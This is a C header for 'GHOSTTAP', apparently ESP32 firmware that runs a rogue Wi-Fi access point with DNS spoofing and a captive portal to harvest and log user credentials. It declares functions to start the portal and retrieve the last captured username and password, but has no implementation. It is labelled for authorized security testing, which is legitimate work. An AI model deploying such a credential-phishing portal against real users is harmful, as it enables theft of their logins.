/*
 * GHOSTTAP evil portal — SoftAP + DNS spoof + HTTP captive portal.
 *
 * Starts a WPA2 SoftAP whose DNS server answers every A query with the
 * AP's own IP, so any client is served the portal page.  Submitted
 * credentials are stored and logged to the SD card.
 *
 * This firmware is for authorized security testing only.
 */
#pragma once

#include <stdbool.h>
#include <stdint.h>
#include "esp_err.h"

#ifdef __cplusplus
extern "C" {
#endif

esp_err_t evil_portal_start(const char *ap_ssid, const char *ap_pass);
void     evil_portal_stop(void);
bool     evil_portal_is_running(void);
void     evil_portal_get_last_creds(char *user, size_t ulen,
                                    char *pass, size_t plen);
void     evil_portal_get_stats(uint32_t *attempts);

#ifdef __cplusplus
}
#endif
